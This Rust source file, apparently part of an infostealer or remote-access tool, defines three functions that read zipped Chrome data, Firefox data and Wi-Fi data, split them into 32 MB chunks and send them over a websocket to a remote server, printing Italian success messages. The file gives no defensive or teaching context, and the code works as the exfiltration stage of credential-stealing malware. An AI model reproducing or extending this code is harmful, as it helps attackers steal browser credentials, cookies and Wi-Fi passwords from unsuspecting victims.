
use std::{fs, net::TcpStream};
use uuid::Uuid;
use websocket::sync::Client;

#[path = "./dataframes.rs"]
mod dataframes;

pub fn send_google_chrome_data(tx_id: Uuid, zipped_dir_path: &String, mut server: &mut Client<TcpStream>) {
    let tx_id_string = tx_id.to_string();
   
    let chunk_size: usize = 32*1024*1024;
    let file = fs::read(zipped_dir_path).unwrap();
    let mut i: u8 = 0;
    for chunk in file.chunks(chunk_size){
        let data = chunk.to_vec();
        let service = &String::from("google_chrome");
        
        let dataframe = dataframes::create_dataframe(&tx_id_string, &service, i, data);

        if(server.send_dataframe(&dataframe).is_ok()){
            println!("PACCHETTO INVIATO CON SUCCESSO");
        }

        i += 1;
    }

    let service = &String::from("google_chrome_end");
    let end_dataframe = dataframes::create_dataframe(&tx_id_string, &service, 0, Vec::<u8>::new());
   
    if(server.send_dataframe(&end_dataframe).is_ok()){
        println!("PACCHETTO FINALE INVIATO CON SUCCESSO");
    }
}

pub fn send_firefox_data(tx_id: Uuid, zipped_dir_path: &String, mut server: &mut Client<TcpStream>) {
    let tx_id_string = tx_id.to_string();
   
    let chunk_size: usize = 32*1024*1024;
    let file = fs::read(zipped_dir_path).unwrap();
    let mut i: u8 = 0;
    for chunk in file.chunks(chunk_size){
        let data = chunk.to_vec();
        let service = &String::from("firefox");
        
        let dataframe = dataframes::create_dataframe(&tx_id_string, &service, i, data);

        if(server.send_dataframe(&dataframe).is_ok()){
            println!("PACCHETTO INVIATO CON SUCCESSO");
        }

        i += 1;
    }

    let service = &String::from("firefox_end");
    let end_dataframe = dataframes::create_dataframe(&tx_id_string, &service, 0, Vec::<u8>::new());
   
    if(server.send_dataframe(&end_dataframe).is_ok()){
        println!("PACCHETTO FINALE INVIATO CON SUCCESSO");
    }
}

pub fn send_wifi_data(tx_id: Uuid, zipped_dir_path: &String, mut server: &mut Client<TcpStream>) {
    let tx_id_string = tx_id.to_string();
   
    let chunk_size: usize = 32*1024*1024;
    let file = fs::read(zipped_dir_path).unwrap();
    let mut i: u8 = 0;
    
    for chunk in file.chunks(chunk_size){
        let data = chunk.to_vec();
        let service = &String::from("send_wifi_data");
        
        let dataframe = dataframes::create_dataframe(&tx_id_string, &service, i, data);

        if(server.send_dataframe(&dataframe).is_ok()){
            println!("PACCHETTO INVIATO CON SUCCESSO");
        }

        i += 1;
    }

    let service = &String::from("send_wifi_data_end");
    let end_dataframe = dataframes::create_dataframe(&tx_id_string, &service, 0, Vec::<u8>::new());
   
    if(server.send_dataframe(&end_dataframe).is_ok()){
        println!("PACCHETTO FINALE INVIATO CON SUCCESSO");
    }
}